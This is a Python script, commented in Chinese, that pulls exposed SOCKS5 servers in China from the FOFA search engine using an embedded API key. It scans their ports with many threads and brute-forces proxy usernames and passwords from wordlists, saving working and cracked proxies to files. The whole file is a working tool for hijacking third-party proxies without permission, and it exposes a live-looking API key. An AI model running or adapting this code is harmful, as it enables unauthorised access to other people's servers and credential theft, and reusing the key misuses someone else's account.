from concurrent.futures import ThreadPoolExecutor
import socket
import warnings
import os
import requests

warnings.filterwarnings("ignore")

# 固定变量
FOFA_KEY = "c77484c6157fbeb48652288c6f4fa5a6"  # 用户提供的Fofa API Key
FOFA_URL = f"https://fofa.info/api/v1/search/all?key={FOFA_KEY}&qbase64=cHJvdG9jb2w9PSJzb2NrczUiICYmICJWZXJzaW9uOjUgTWV0aG9kOk5vIEF1dGhlbnRpY2F0aW9uKDB4MDApIiAmJiBjb3VudHJ5PSJDTiI=&size=5000"

# 获取当前脚本所在目录
script_dir = os.path.dirname(os.path.abspath(__file__))

# 文件名 - 使用脚本所在目录
FOFA_OUTPUT_FILE = os.path.join(script_dir, "fofa_results.txt")
PORT_OPEN_FILE = os.path.join(script_dir, "open_ports.txt")
VALID_PROXY_FILE = os.path.join(script_dir, "valid_proxies.txt")

# 爬取 Fofa 数据并保存到指定文件
def fetch_fofa_data():
    if not FOFA_KEY:
        print("FOFA_KEY 未设置，跳过 Fofa 数据爬取")
        return

    print("正在爬取 Fofa 数据")
    response = requests.get(FOFA_URL)
    data = response.json()

    print("正在提取数据")
    extracted_data = [result[0] for result in data['results']]

    with open(FOFA_OUTPUT_FILE, 'w') as f:
        for it in extracted_data:
            f.write(it + '\n')

    print(f"数据爬取完毕，结果已保存到 {FOFA_OUTPUT_FILE}")

# 测试端口是否开放
def test_port(proxy):
    proxy = proxy.strip()
    ip, port = proxy.split(":")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        result = sock.connect_ex((ip, int(port)))
        if result == 0:
            with open(PORT_OPEN_FILE, 'a') as f:  # 追加模式
                f.write(proxy + '\n')
        sock.close()
    except socket.error:
        pass

def check_ports():
    print("正在测试端口开放情况")
    try:
        with open(FOFA_OUTPUT_FILE, "r") as f:
            proxies = f.readlines()
    except FileNotFoundError:
        print(f"{FOFA_OUTPUT_FILE} 文件不存在，请检查或手动创建")
        return

    with ThreadPoolExecutor(max_workers=100) as executor:
        executor.map(test_port, proxies)

    print(f"端口检测完毕，结果已保存到 {PORT_OPEN_FILE}")

# 测试代理的有效性，并输出对应的用户名和密码
def test_proxy(proxy):
    try:
        # 尝试无密码代理
        response = requests.get(
            'https://www.baidu.com/',
            proxies={'http': f"socks5://{proxy}", 'https': f"socks5://{proxy}"},
            timeout=6,
            verify=False
        )
        if response.status_code == 200:
            print(f'Working proxy: {proxy}')
            with open(VALID_PROXY_FILE, 'a') as file:  # 追加模式
                file.write(f'socks5://{proxy}\n')
            return
    except:
        pass

    # 尝试使用用户名和密码
    with open('user.txt', 'r') as user_file:
        usernames = [line.strip() for line in user_file.readlines()]
    with open('pass.txt', 'r') as pass_file:
        passwords = [line.strip() for line in pass_file.readlines()]

    for username in usernames:
        for password in passwords:
            try:
                response2 = requests.get(
                    'https://www.baidu.com/',
                    proxies={
                        'http': f"socks5://{username}:{password}@{proxy}",
                        'https': f"socks5://{username}:{password}@{proxy}"
                    },
                    timeout=3,
                    verify=False
                )
                if response2.status_code == 200:
                    print(f'Working proxy with auth: {username}:{password}@{proxy}')
                    with open(VALID_PROXY_FILE, 'a') as file:
                        file.write(f'socks5://{username}:{password}@{proxy}\n')
                    return
            except:
                pass

# 主函数
def main():
    # 清空之前的结果文件
    open(FOFA_OUTPUT_FILE, 'w').close()
    open(PORT_OPEN_FILE, 'w').close()
    open(VALID_PROXY_FILE, 'w').close()

    # 爬取Fofa数据
    fetch_fofa_data()

    # 检测端口开放情况
    check_ports()

    # 检测代理有效性
    try:
        with open(PORT_OPEN_FILE, "r") as f:
            proxies = f.readlines()
    except FileNotFoundError:
        print(f"{PORT_OPEN_FILE} 文件不存在")
        return

    print(f"正在检测 {len(proxies)} 个代理的有效性")
    with ThreadPoolExecutor(max_workers=50) as executor:
        executor.map(test_proxy, proxies)

    print("代理检测完毕，有效的代理已保存到 valid_proxies.txt")

if __name__ == '__main__':
    main()